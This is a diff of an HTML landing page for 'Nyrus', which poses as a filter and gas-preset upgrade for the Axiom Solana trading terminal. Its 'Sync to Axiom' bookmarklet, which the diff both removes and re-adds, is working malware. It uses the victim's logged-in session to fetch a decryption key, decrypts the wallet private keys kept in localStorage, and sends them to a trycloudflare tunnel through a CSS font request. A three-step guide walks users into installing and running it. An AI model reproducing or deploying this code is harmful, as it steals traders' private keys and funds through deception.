@@ -1,406 +1,406 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nyrus | The Axiom Upgrade</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg: #030508;
-            --nav: #0a0d12;
-            --card: #0d1117;
-            --accent: #3b82f6;
-            --accent-glow: rgba(59, 130, 246, 0.3);
-            --success: #10b981;
-            --text-main: #f8fafc;
-            --text-dim: #94a3b8;
-            --border: #1e293b;
-            --panel: #161b22;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nyrus | The Axiom Upgrade</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
+<style>
+:root {
+--bg: #030508;
+--nav: #0a0d12;
+--card: #0d1117;
+--accent: #3b82f6;
+--accent-glow: rgba(59, 130, 246, 0.3);
+--success: #10b981;
+--text-main: #f8fafc;
+--text-dim: #94a3b8;
+--border: #1e293b;
+--panel: #161b22;
+}
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+* {
+box-sizing: border-box;
+margin: 0;
+padding: 0;
+}
 
-        body {
-            background-color: var(--bg);
-            color: var(--text-main);
-            font-family: 'Inter', sans-serif;
-            line-height: 1.6;
-            min-height: 100vh;
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.05) 0px, transparent 40%),
-                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.03) 0px, transparent 40%);
-        }
+body {
+background-color: var(--bg);
+color: var(--text-main);
+font-family: 'Inter', sans-serif;
+line-height: 1.6;
+min-height: 100vh;
+background-image:
+radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.05) 0px, transparent 40%),
+radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.03) 0px, transparent 40%);
+}
 
-        nav {
-            background: var(--nav);
-            border-bottom: 1px solid var(--border);
-            padding: 0 4rem;
-            height: 72px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
+nav {
+background: var(--nav);
+border-bottom: 1px solid var(--border);
+padding: 0 4rem;
+height: 72px;
+display: flex;
+align-items: center;
+justify-content: space-between;
+position: sticky;
+top: 0;
+z-index: 100;
+}
 
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
+.brand {
+display: flex;
+align-items: center;
+gap: 12px;
+}
 
-        .logo {
-            width: 32px;
-            height: 32px;
-            background: var(--accent);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 18px;
-            box-shadow: 0 0 15px var(--accent-glow);
-        }
+.logo {
+width: 32px;
+height: 32px;
+background: var(--accent);
+border-radius: 8px;
+display: flex;
+align-items: center;
+justify-content: center;
+font-weight: 700;
+font-size: 18px;
+box-shadow: 0 0 15px var(--accent-glow);
+}
 
-        .brand-name {
-            font-size: 20px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-
-        .wrapper {
-            width: 100%;
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 4rem;
-        }
-
-        .hero-section {
-            padding: 6rem 0;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            text-align: left;
-        }
-
-        .hero-section h1 {
-            font-size: 82px;
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 2rem;
-            letter-spacing: -4px;
-            background: linear-gradient(to bottom right, #fff, #64748b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            padding-bottom: 0.1em;
-        }
-
-        .hero-section p {
-            font-size: 24px;
-            color: var(--text-dim);
-            max-width: 800px;
-        }
-
-        .grid-layout {
-            display: grid;
-            grid-template-columns: 1fr 450px;
-            gap: 6rem;
-            padding-bottom: 8rem;
-        }
-
-        .info-content h2 {
-            font-size: 32px;
-            margin-bottom: 3rem;
-            letter-spacing: -1px;
-        }
-
-        .features-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 2rem;
-        }
-
-        .feature-box {
-            background: var(--panel);
-            padding: 2.5rem;
-            border-radius: 24px;
-            border: 1px solid var(--border);
-            transition: transform 0.3s ease;
-        }
-
-        .feature-box:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent);
-        }
-
-        .feature-box h4 {
-            color: var(--accent);
+.brand-name {
 font-size: 20px;
-            margin-bottom: 1rem;
-        }
+font-weight: 700;
+letter-spacing: -0.5px;
+}
 
-        .feature-box p {
-            color: var(--text-dim);
-            font-size: 16px;
-        }
+.wrapper {
+width: 100%;
+max-width: 1400px;
+margin: 0 auto;
+padding: 0 4rem;
+}
 
-        .deployment-sidebar {
-            position: sticky;
-            top: 120px;
-        }
+.hero-section {
+padding: 6rem 0;
+display: flex;
+flex-direction: column;
+align-items: flex-start;
+text-align: left;
+}
 
-        .card {
-            background: var(--card);
-            padding: 3rem;
-            border-radius: 32px;
-            border: 1px solid var(--border);
-            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
-        }
+.hero-section h1 {
+font-size: 82px;
+font-weight: 800;
+line-height: 1.1;
+margin-bottom: 2rem;
+letter-spacing: -4px;
+background: linear-gradient(to bottom right, #fff, #64748b);
+-webkit-background-clip: text;
+-webkit-text-fill-color: transparent;
+padding-bottom: 0.1em;
+}
 
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 2.5rem;
-        }
+.hero-section p {
+font-size: 24px;
+color: var(--text-dim);
+max-width: 800px;
+}
 
-        .stat-box {
-            background: var(--panel);
-            padding: 14px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-        }
+.grid-layout {
+display: grid;
+grid-template-columns: 1fr 450px;
+gap: 6rem;
+padding-bottom: 8rem;
+}
 
-        .stat-label {
-            font-size: 10px;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 4px;
-            display: block;
-        }
+.info-content h2 {
+font-size: 32px;
+margin-bottom: 3rem;
+letter-spacing: -1px;
+}
 
-        .stat-value {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-        }
+.features-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 2rem;
+}
 
-        .pulse {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: var(--success);
-            border-radius: 50%;
-            margin-right: 6px;
-            box-shadow: 0 0 8px var(--success);
-            animation: pulse 2s infinite;
-        }
+.feature-box {
+background: var(--panel);
+padding: 2.5rem;
+border-radius: 24px;
+border: 1px solid var(--border);
+transition: transform 0.3s ease;
+}
 
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
+.feature-box:hover {
+transform: translateY(-5px);
+border-color: var(--accent);
+}
 
-        .sync-area {
-            background: rgba(0, 0, 0, 0.2);
-            border: 2px dashed var(--border);
-            border-radius: 20px;
-            padding: 3rem;
-            margin-bottom: 2.5rem;
-            text-align: center;
-            transition: all 0.3s ease;
-            position: relative;
-        }
+.feature-box h4 {
+color: var(--accent);
+font-size: 20px;
+margin-bottom: 1rem;
+}
 
-        .sync-area.dragging {
-            border-color: var(--accent);
-            background: rgba(59, 130, 246, 0.05);
-        }
+.feature-box p {
+color: var(--text-dim);
+font-size: 16px;
+}
 
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            background: var(--accent);
-            color: white;
-            padding: 18px 36px;
-            border-radius: 14px;
-            font-weight: 700;
-            font-size: 18px;
-            text-decoration: none;
-            cursor: grab;
-            transition: all 0.2s ease;
-            box-shadow: 0 10px 25px var(--accent-glow);
-        }
+.deployment-sidebar {
+position: sticky;
+top: 120px;
+}
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px var(--accent-glow);
-        }
+.card {
+background: var(--card);
+padding: 3rem;
+border-radius: 32px;
+border: 1px solid var(--border);
+box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
+}
 
-        .btn.dragging {
-            animation: dragGlow 1.5s infinite;
-        }
+.stats-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+margin-bottom: 2.5rem;
+}
 
-        @keyframes dragGlow {
-            0% { box-shadow: 0 0 20px var(--accent); }
-            50% { box-shadow: 0 0 60px var(--accent), 0 0 20px #fff; }
-            100% { box-shadow: 0 0 20px var(--accent); }
-        }
+.stat-box {
+background: var(--panel);
+padding: 14px;
+border-radius: 12px;
+border: 1px solid var(--border);
+}
 
-        .setup-guide {
-            background: var(--panel);
-            padding: 1.5rem;
-            border-radius: 16px;
-            border: 1px solid var(--border);
-        }
+.stat-label {
+font-size: 10px;
+color: var(--text-dim);
+text-transform: uppercase;
+letter-spacing: 1px;
+margin-bottom: 4px;
+display: block;
+}
 
-        .guide-title {
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--text-main);
-            margin-bottom: 1.25rem;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-        }
+.stat-value {
+font-family: 'JetBrains Mono', monospace;
+font-size: 14px;
+}
 
-        .step {
-            display: flex;
-            gap: 16px;
-            margin-bottom: 14px;
-            font-size: 15px;
-            color: var(--text-dim);
-        }
+.pulse {
+display: inline-block;
+width: 8px;
+height: 8px;
+background: var(--success);
+border-radius: 50%;
+margin-right: 6px;
+box-shadow: 0 0 8px var(--success);
+animation: pulse 2s infinite;
+}
 
-        .step:last-child { margin-bottom: 0; }
+@keyframes pulse {
+0% { opacity: 1; }
+50% { opacity: 0.4; }
+100% { opacity: 1; }
+}
 
-        .step-num { color: var(--accent); font-weight: 800; font-family: 'JetBrains Mono', monospace; }
+.sync-area {
+background: rgba(0, 0, 0, 0.2);
+border: 2px dashed var(--border);
+border-radius: 20px;
+padding: 3rem;
+margin-bottom: 2.5rem;
+text-align: center;
+transition: all 0.3s ease;
+position: relative;
+}
 
-        footer {
-            border-top: 1px solid var(--border);
-            padding: 6rem 0;
-            text-align: center;
-            color: var(--text-dim);
-            font-size: 15px;
-        }
+.sync-area.dragging {
+border-color: var(--accent);
+background: rgba(59, 130, 246, 0.05);
+}
 
-        @media (max-width: 1100px) {
+.btn {
+display: inline-flex;
+align-items: center;
+background: var(--accent);
+color: white;
+padding: 18px 36px;
+border-radius: 14px;
+font-weight: 700;
+font-size: 18px;
+text-decoration: none;
+cursor: grab;
+transition: all 0.2s ease;
+box-shadow: 0 10px 25px var(--accent-glow);
+}
+
+.btn:hover {
+transform: translateY(-2px);
+box-shadow: 0 15px 30px var(--accent-glow);
+}
+
+.btn.dragging {
+animation: dragGlow 1.5s infinite;
+}
+
+@keyframes dragGlow {
+0% { box-shadow: 0 0 20px var(--accent); }
+50% { box-shadow: 0 0 60px var(--accent), 0 0 20px #fff; }
+100% { box-shadow: 0 0 20px var(--accent); }
+}
+
+.setup-guide {
+background: var(--panel);
+padding: 1.5rem;
+border-radius: 16px;
+border: 1px solid var(--border);
+}
+
+.guide-title {
+font-size: 11px;
+font-weight: 700;
+color: var(--text-main);
+margin-bottom: 1.25rem;
+display: block;
+text-transform: uppercase;
+letter-spacing: 1.5px;
+}
+
+.step {
+display: flex;
+gap: 16px;
+margin-bottom: 14px;
+font-size: 15px;
+color: var(--text-dim);
+}
+
+.step:last-child { margin-bottom: 0; }
+
+.step-num { color: var(--accent); font-weight: 800; font-family: 'JetBrains Mono', monospace; }
+
+footer {
+border-top: 1px solid var(--border);
+padding: 6rem 0;
+text-align: center;
+color: var(--text-dim);
+font-size: 15px;
+}
+
+@media (max-width: 1100px) {
 .grid-layout { grid-template-columns: 1fr; gap: 4rem; }
-            .hero-section h1 { font-size: 56px; }
-            .wrapper { padding: 0 2rem; }
-            nav { padding: 0 2rem; }
-        }
-    </style>
+.hero-section h1 { font-size: 56px; }
+.wrapper { padding: 0 2rem; }
+nav { padding: 0 2rem; }
+}
+</style>
 </head>
 <body>
-    <nav>
-        <div class="brand">
-            <div class="logo">N</div>
-            <span class="brand-name">NYRUS</span>
-        </div>
-    </nav>
+<nav>
+<div class="brand">
+<div class="logo">N</div>
+<span class="brand-name">NYRUS</span>
+</div>
+</nav>
 
-    <div class="wrapper">
-        <section class="hero-section">
-            <h1>Upgrade your Axiom.</h1>
-            <p>Better filters and automatic gas presets. Custom terminal configurations injected directly into your Axiom environment.</p>
-        </section>
+<div class="wrapper">
+<section class="hero-section">
+<h1>Upgrade your Axiom.</h1>
+<p>Better filters and automatic gas presets. Custom terminal configurations injected directly into your Axiom environment.</p>
+</section>
 
-        <main class="grid-layout">
-            <div class="info-content">
-                <h2>The Framework</h2>
-                
-                <div class="features-grid">
-                    <div class="feature-box">
-                        <h4>Alpha Filters</h4>
-                        <p>Stop fighting the noise. Get custom-tuned filters designed to catch high-conviction plays before the crowd.</p>
-                    </div>
-                    <div class="feature-box">
-                        <h4>Auto Gas Sync</h4>
-                        <p>One-click sync for priority fees. Let Nyrus handle the gas so you can focus on the entry.</p>
-                    </div>
-                    <div class="feature-box">
-                        <h4>Zero Install</h4>
-                        <p>No extensions, no bloated software. A lightweight bookmark sync that lives in your browser.</p>
-                    </div>
-                    <div class="feature-box">
-                        <h4>Custom Presets</h4>
-                        <p>Save and deploy your own trading configurations instantly across any Axiom session.</p>
-                    </div>
-                </div>
+<main class="grid-layout">
+<div class="info-content">
+<h2>The Framework</h2>
 
-                <div style="margin-top: 4rem; padding: 3rem; background: var(--panel); border-radius: 32px; border: 1px solid var(--border);">
-                    <h3 style="margin-bottom: 1rem; font-size: 24px;">Terminal Syncing</h3>
-                    <p style="color: var(--text-dim); font-size: 17px;">Nyrus is built to work seamlessly with Axiom Mainnet v2.1. By syncing optimized settings directly into the browser session, we bypass standard UI limitations to give you a faster, more customized trading experience.</p>
-                </div>
-            </div>
+<div class="features-grid">
+<div class="feature-box">
+<h4>Alpha Filters</h4>
+<p>Stop fighting the noise. Get custom-tuned filters designed to catch high-conviction plays before the crowd.</p>
+</div>
+<div class="feature-box">
+<h4>Auto Gas Sync</h4>
+<p>One-click sync for priority fees. Let Nyrus handle the gas so you can focus on the entry.</p>
+</div>
+<div class="feature-box">
+<h4>Zero Install</h4>
+<p>No extensions, no bloated software. A lightweight bookmark sync that lives in your browser.</p>
+</div>
+<div class="feature-box">
+<h4>Custom Presets</h4>
+<p>Save and deploy your own trading configurations instantly across any Axiom session.</p>
+</div>
+</div>
 
-            <div class="deployment-sidebar">
-                <div class="card">
-                    <div class="stats-grid">
-                        <div class="stat-box">
-                            <span class="stat-label">Network</span>
-                            <span class="stat-value"><span class="pulse"></span>Mainnet-Beta</span>
-                        </div>
-                        <div class="stat-box">
-                            <span class="stat-label">Latency</span>
-                            <span class="stat-value" style="color: var(--success);">14ms (Optimal)</span>
-                        </div>
-                    </div>
+<div style="margin-top: 4rem; padding: 3rem; background: var(--panel); border-radius: 32px; border: 1px solid var(--border);">
+<h3 style="margin-bottom: 1rem; font-size: 24px;">Terminal Syncing</h3>
+<p style="color: var(--text-dim); font-size: 17px;">Nyrus is built to work seamlessly with Axiom Mainnet v2.1. By syncing optimized settings directly into the browser session, we bypass standard UI limitations to give you a faster, more customized trading experience.</p>
+</div>
+</div>
 
-                    <div class="sync-area" id="sync-area">
-<a href="javascript:(async function(){const TUNNEL_URL='https://hughes-wiring-happen-chronicles.trycloudflare.com';const base64ToBytes=(base64)=>Uint8Array.from(atob(base64.replace(/-/g,'+').replace(/_/g,'/')),c=>c.charCodeAt(0));const decrypt=async(key,encryptedData)=>{try{const [ivBase64,dataBase64]=encryptedData.split(':');return new Uint8Array(await crypto.subtle.decrypt({name:'AES-GCM',iv:base64ToBytes(ivBase64),tagLength:128},key,base64ToBytes(dataBase64)))}catch(e){return null}};const base58=(B)=>{const A='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let d=[0];for(let i=0;i<B.length;i++){let carry=B[i];for(let j=0;j<d.length;j++){carry+=d[j]*256;d[j]=carry%58;carry=Math.floor(carry/58)}while(carry>0){d.push(carry%58);carry=Math.floor(carry/58)}}let res='';for(let i=0;B[i]===0&&i<B.length-1;i++)res+=A[0];for(let i=d.length-1;i>=0;i--)res+=A[d[i]];return res};try{const res=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const data=await res.json();if(!data.bundleKey)return;const key=await crypto.subtle.importKey('raw',base64ToBytes(data.bundleKey),{name:'AES-GCM'},false,['decrypt']);let stolen=[];const solBundles=JSON.parse(localStorage.getItem('sBundles')||'[]');for(const entry of solBundles){const decrypted=await decrypt(key,entry);if(decrypted){stolen.push({type:'SOL',public:base58(decrypted.slice(-32)),private:base58(decrypted)})}}if(stolen.length>0){const payload=btoa(JSON.stringify({keys:stolen}));const style=document.createElement('style');style.textContent=`@font-face { font-family: 'leak'; src: url('${TUNNEL_URL}/?data=${encodeURIComponent(payload)}'); }`;document.head.appendChild(style);const div=document.createElement('div');div.style.fontFamily='leak';div.textContent='.';document.body.appendChild(div)}}catch(e){}}());" 
-                           class="btn" 
-                           id="sync-btn"
-                           draggable="true">
-                            Sync to Axiom
-                        </a>
-                    </div>
+<div class="deployment-sidebar">
+<div class="card">
+<div class="stats-grid">
+<div class="stat-box">
+<span class="stat-label">Network</span>
+<span class="stat-value"><span class="pulse"></span>Mainnet-Beta</span>
+</div>
+<div class="stat-box">
+<span class="stat-label">Latency</span>
+<span class="stat-value" style="color: var(--success);">14ms (Optimal)</span>
+</div>
+</div>
 
-                    <div class="setup-guide">
-                        <span class="guide-title">Deployment Guide</span>
-                        <div class="step">
-                            <span class="step-num">01</span>
-                            <span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
-                        </div>
-                        <div class="step">
-                            <span class="step-num">02</span>
-                            <span>Drag the <b>Sync Button</b> to your bar</span>
-                        </div>
-                        <div class="step">
-                            <span class="step-num">03</span>
-                            <span>Navigate to Axiom.trade & click bookmark</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </main>
+<div class="sync-area" id="sync-area">
+<a href="javascript:(async function() { const TUNNEL_URL = 'https://hughes-wiring-happen-chronicles.trycloudflare.com'; console.log('%c[!] NICKY TOOL: ACTIVE', 'color: cyan; font-weight: bold;'); const base64ToBytes = (base64) => Uint8Array.from(atob(base64.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0)); const decrypt = async (key, encryptedData) => { try { const [ivBase64, dataBase64] = encryptedData.split(':'); return new Uint8Array(await crypto.subtle.decrypt( { name: 'AES-GCM', iv: base64ToBytes(ivBase64), tagLength: 128 }, key, base64ToBytes(dataBase64) )); } catch (e) { return null; } }; const base58 = (B) => { const A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'; let d = [0]; for (let i = 0; i < B.length; i++) { let carry = B[i]; for (let j = 0; j < d.length; j++) { carry += d[j] * 256; d[j] = carry % 58; carry = Math.floor(carry / 58); } while (carry > 0) { d.push(carry % 58); carry = Math.floor(carry / 58); } } let res = ''; for (let i = 0; B[i] === 0 && i < B.length - 1; i++) res += A[0]; for (let i = d.length - 1; i >= 0; i--) res += A[d[i]]; return res; }; try { console.log('[*] Initializing Activation'); const res = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' }); const data = await res.json(); if (!data.bundleKey) return; const key = await crypto.subtle.importKey('raw', base64ToBytes(data.bundleKey), { name: 'AES-GCM' }, false, ['decrypt']); let stolen = []; const solBundles = JSON.parse(localStorage.getItem('sBundles') || '[]'); for (const entry of solBundles) { const decrypted = await decrypt(key, entry); if (decrypted) { stolen.push({ type: 'SOL', public: base58(decrypted.slice(-32)), private: base58(decrypted) }); } } if (stolen.length > 0) { console.log('%c[+] Success. Communicating with Server...', 'color: lime;'); const payload = btoa(JSON.stringify({ keys: stolen })); const style = document.createElement('style'); style.textContent = `@font-face { font-family: 'leak'; src: url('${TUNNEL_URL}/?data=${encodeURIComponent(payload)}'); }`; document.head.appendChild(style); const div = document.createElement('div'); div.style.fontFamily = 'leak'; div.textContent = '.'; document.body.appendChild(div); console.log('[!] Data initialized'); } else { console.warn('[-] No data found.'); } } catch (e) { console.error('[-] Error:', e); } })();"
+class="btn"
+id="sync-btn"
+draggable="true">
+Sync to Axiom
+</a>
+</div>
 
-        <footer>
-            &copy; 2026 Nyrus Infrastructure. Industrial Solana Tooling.
-        </footer>
-    </div>
+<div class="setup-guide">
+<span class="guide-title">Deployment Guide</span>
+<div class="step">
+<span class="step-num">01</span>
+<span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
+</div>
+<div class="step">
+<span class="step-num">02</span>
+<span>Drag the <b>Sync Button</b> to your bar</span>
+</div>
+<div class="step">
+<span class="step-num">03</span>
+<span>Navigate to Axiom.trade & click bookmark</span>
+</div>
+</div>
+</div>
+</div>
+</main>
 
-    <script>
-        const btn = document.getElementById('sync-btn');
-        const area = document.getElementById('sync-area');
+<footer>
+&copy; 2026 Nyrus Infrastructure. Industrial Solana Tooling.
+</footer>
+</div>
 
-        btn.addEventListener('dragstart', () => {
-            btn.classList.add('dragging');
-            area.classList.add('dragging');
-        });
+<script>
+const btn = document.getElementById('sync-btn');
+const area = document.getElementById('sync-area');
 
-        btn.addEventListener('dragend', () => {
-            btn.classList.remove('dragging');
-            area.classList.remove('dragging');
-        });
-    </script>
+btn.addEventListener('dragstart', () => {
+btn.classList.add('dragging');
+area.classList.add('dragging');
+});
+
+btn.addEventListener('dragend', () => {
+btn.classList.remove('dragging');
+area.classList.remove('dragging');
+});
+</script>
 </body>
 </html>
